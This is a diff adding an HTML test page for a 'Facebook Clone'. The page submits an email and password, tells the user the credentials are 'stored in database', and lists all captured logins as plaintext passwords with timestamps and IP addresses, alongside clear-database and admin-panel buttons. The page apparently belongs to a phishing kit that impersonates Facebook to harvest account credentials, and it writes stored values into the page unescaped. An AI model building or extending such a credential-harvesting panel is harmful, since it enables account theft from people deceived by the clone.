@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Database Test - Facebook Clone</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #f0f2f5;
+        }
+
+        .test-container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .test-form {
+            margin-bottom: 30px;
+            padding: 20px;
+            border: 2px solid #1877f2;
+            border-radius: 8px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        button {
+            background: #1877f2;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 5px;
+        }
+
+        button:hover {
+            background: #166fe5;
+        }
+
+        .results {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+
+        .credential-item {
+            background: white;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 6px;
+            border-left: 4px solid #1877f2;
+        }
+
+        .success {
+            color: #28a745;
+            font-weight: bold;
+        }
+
+        .error {
+            color: #dc3545;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="test-container">
+        <h1>🔐 Facebook Clone Database Test</h1>
+        <p>This page demonstrates the login credential storage functionality.</p>
+
+        <div class="test-form">
+            <h3>Test Login (Credentials will be stored in database)</h3>
+            <form id="testForm">
+                <div class="form-group">
+                    <label for="testEmail">Email:</label>
+                    <input type="email" id="testEmail" name="email" placeholder="test@example.com" required>
+                </div>
+                <div class="form-group">
+                    <label for="testPassword">Password:</label>
+                    <input type="password" id="testPassword" name="password" placeholder="Enter password (6+ chars)"
+                        required>
+                </div>
+                <button type="submit">🔐 Test Login & Store</button>
+            </form>
+        </div>
+
+        <div>
+            <button onclick="loadStoredCredentials()">📊 Load Stored Credentials</button>
+            <button onclick="clearDatabase()">🗑️ Clear Database</button>
+            <button onclick="openAdmin()">👨‍💼 Open Admin Panel</button>
+        </div>
+
+        <div class="results" id="results">
+            <p>Click "Load Stored Credentials" to see what's in the database...</p>
+        </div>
+    </div>
+
+    <script>
+        // Handle test form submission
+        document.getElementById('testForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const email = document.getElementById('testEmail').value;
+            const password = document.getElementById('testPassword').value;
+            const results = document.getElementById('results');
+
+            results.innerHTML = '<p>⏳ Sending login request...</p>';
+
+            try {
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ email, password })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    results.innerHTML = `
+                        <p class="success">✅ Login successful! Credentials stored in database.</p>
+                        <p><strong>Email:</strong> ${email}</p>
+                        <p><strong>Password:</strong> ${password}</p>
+                        <p><strong>Timestamp:</strong> ${new Date().toLocaleString()}</p>
+                    `;
+                } else {
+                    results.innerHTML = `<p class="error">❌ Login failed: ${data.message}</p>`;
+                }
+            } catch (error) {
+                results.innerHTML = `<p class="error">❌ Error: ${error.message}</p>`;
+            }
+        });
+
+        // Load and display stored credentials
+        async function loadStoredCredentials() {
+            const results = document.getElementById('results');
+            results.innerHTML = '<p>⏳ Loading stored credentials...</p>';
+
+            try {
+                const response = await fetch('/api/credentials');
+                const data = await response.json();
+
+                if (data.success) {
+                    if (data.credentials.length === 0) {
+                        results.innerHTML = '<p>📭 No credentials stored yet. Try logging in first!</p>';
+                    } else {
+                        let html = `<h3>📊 Stored Credentials (${data.credentials.length} total)</h3>`;
+
+                        data.credentials.forEach((cred, index) => {
+                            html += `
+                                <div class="credential-item">
+                                    <strong>#${index + 1}</strong><br>
+                                    <strong>Email:</strong> ${cred.email}<br>
+                                    <strong>Password:</strong> ${cred.password}<br>
+                                    <strong>Time:</strong> ${new Date(cred.timestamp).toLocaleString()}<br>
+                                    <strong>IP:</strong> ${cred.ip || 'N/A'}
+                                </div>
+                            `;
+                        });
+
+                        results.innerHTML = html;
+                    }
+                } else {
+                    results.innerHTML = `<p class="error">❌ Error loading credentials: ${data.message}</p>`;
+                }
+            } catch (error) {
+                results.innerHTML = `<p class="error">❌ Error: ${error.message}</p>`;
+            }
+        }
+
+        // Clear database
+        async function clearDatabase() {
+            if (confirm('Are you sure you want to clear all stored credentials?')) {
+                const results = document.getElementById('results');
+                results.innerHTML = '<p>⏳ Clearing database...</p>';
+
+                try {
+                    const response = await fetch('/api/credentials', {
+                        method: 'DELETE'
+                    });
+
+                    const data = await response.json();
+
+                    if (data.success) {
+                        results.innerHTML = '<p class="success">✅ Database cleared successfully!</p>';
+                    } else {
+                        results.innerHTML = `<p class="error">❌ Error: ${data.message}</p>`;
+                    }
+                } catch (error) {
+                    results.innerHTML = `<p class="error">❌ Error: ${error.message}</p>`;
+                }
+            }
+        }
+
+        // Open admin panel
+        function openAdmin() {
+            window.open('/admin', '_blank');
+        }
+
+        // Load credentials on page load
+        window.addEventListener('load', () => {
+            loadStoredCredentials();
+        });
+    </script>
+</body>
+
+</html>
